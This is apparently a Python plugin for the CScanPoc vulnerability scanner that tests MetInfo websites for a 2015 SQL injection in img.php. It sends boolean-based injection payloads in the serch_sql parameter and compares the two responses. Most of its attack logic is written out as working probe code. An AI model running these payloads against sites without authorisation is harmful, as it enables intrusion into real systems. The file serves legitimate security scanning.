# coding: utf-8

from CScanPoc.thirdparty import requests, hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType

class Vuln(ABVuln):
    vuln_id = 'MetInfo_0012' # 平台漏洞编号，留空
    name = 'MetInfo SQL注入'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.INJECTION # 漏洞类型
    disclosure_date = '2015-07-09'  # 漏洞公布时间
    desc = '''
        MetInfo 参数过滤不严，导致SQL注入漏洞。
    '''  # 漏洞描述
    ref = 'Unkonwn'  # 漏洞来源
    cnvd_id = 'Unkonwn'  # cnvd漏洞编号
    cve_id = 'Unkonwn'  # cve编号
    product = 'MetInfo'  # 漏洞应用名称
    product_version = 'Unkonwn'  # 漏洞应用版本

class Poc(ABPoc):
    poc_id = 'e6d05f25-f904-4cc9-aa77-c91fa2febc69'
    author = '47bwy'  # POC编写者
    create_date = '2018-05-15'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())

    def verify(self):
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            
            #wooyun-2015-0125648
            hh = hackhttp.hackhttp()
            payload1 = '/metinfo/img/img.php?class1=1&serch_sql=%201%3D1%23'
            payload2 = '/metinfo/img/img.php?class1=1&serch_sql=%201%3D2%23'
            url1 = self.target + payload1
            url2 = self.target + payload2
            test = "<option selected='selected'"
            code, head, res1, errcode, _ = hh.http(url1)
            code1, head,res2, errcode, _ = hh.http(url2)

            if code == 200 and code1 == 200 and test not in res2 and test in res1:
                #security_hole(url1)
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))               

        except Exception, e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        super(Poc, self).exploit()

if __name__ == '__main__':
    Poc().run()
